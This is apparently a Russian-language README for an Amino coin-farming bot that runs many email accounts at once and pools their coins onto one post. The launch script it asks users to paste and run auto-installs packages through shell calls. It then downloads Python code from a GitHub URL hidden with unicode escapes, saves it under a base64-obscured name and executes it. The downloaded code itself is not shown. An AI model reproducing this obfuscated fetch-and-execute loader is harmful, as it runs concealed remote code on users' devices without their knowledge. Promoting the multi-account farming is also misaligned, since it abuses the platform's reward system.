# Amino-Farm-Bot
Бот для фарма монет в Амино. 
___
- Для фарма нужно создать файл с почтами.
    - Новая почта >> новая строка. 


- Перед фармом бот запросит ссылку на пост (запись в блоге).
    - Сообщество должно быть открытым.

    - Ваш уровень в нем:
        - выше пятого.

    - Монеты придут на этот пост.
___

- Процес.
    - Приносит 38.
        - Может и сотку или больше.
        - Тут уж зависит от инета и везения. 
    - Фарм долгий:
        - иначе мало монет. 

    - Отправка мгновенная со всех аккаунтов сразу:
        - хоть что-то радует. 
___

- Монеты приносит раз в 24 часа.
    - << Не раз в сутки <<.
___

- Модули устанавливаются сами.
    - Просто запустите код:
        - к примеру pydroid3.
___

- Код запуска. 
    - P. S. Перед запуском разрешите pydroid3 доступ к хранилищу. 
 
    - Иначе он не сможет найти файл.

```
def modules():
    import os
    import time
    
    while True:
        try:
            import requests, os, time
            import base64
            
            break
        
        except Exception as error:
            while True:
                error = str(error)
                module = error[error.index("'") + 1: ][0: error[error.index("'") + 1: ].index("'")]

                try:
                    print("Найден неисправный модуль >> {} <<.\n".format(module))
            
                    time.sleep(5)
            
                    if "fix" in module:
                        module = "amino.fix"
                
                    else:
                        if "websocket" in module:
                            module = "websocket-client"
                        
                        else:
                            if "six" == module:
                                os.system("yes|pip uninstall six")
                        
                    os.system("pip install {} && cls || clear".format(module))
                    
                    break
                    
                except Exception as error:
                    pass
    
print("Проверка модулей...\n")
modules()

import requests, os, time
import base64

print("Проверка модулей прошла успешно.\n")

name = base64.b64encode("\u0041\u006e\u0061\u006e\u0061\u0073\u0069\u006b".encode("ascii")).decode().split("=")[0]
code = requests.get("\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0072\u0061\u0077\u002e\u0067\u0069\u0074\u0068\u0075\u0062\u0075\u0073\u0065\u0072\u0063\u006f\u006e\u0074\u0065\u006e\u0074\u002e\u0063\u006f\u006d\u002f\u0041\u006d\u0065\u0044\u0061\u0072\u006b\u002f\u0041\u006d\u0069\u006e\u006f\u002d\u0046\u0061\u0072\u006d\u002d\u0042\u006f\u0074\u002f\u006d\u0061\u0069\u006e\u002f\u0066\u0061\u0072\u006d\u002e\u0070\u0079").text

open("{}.py".format(name), "w").write(code)
time.sleep(5)
os.system("clear || cls")
os.system("echo 'Ananasik :3 \n'")

from threading import Thread
def work():
    __import__(name)

Thread(target = work).start()

time.sleep(1000000)
```
___

- По вопросам:
    - [Телеграмм](https://t.me/meow3942).
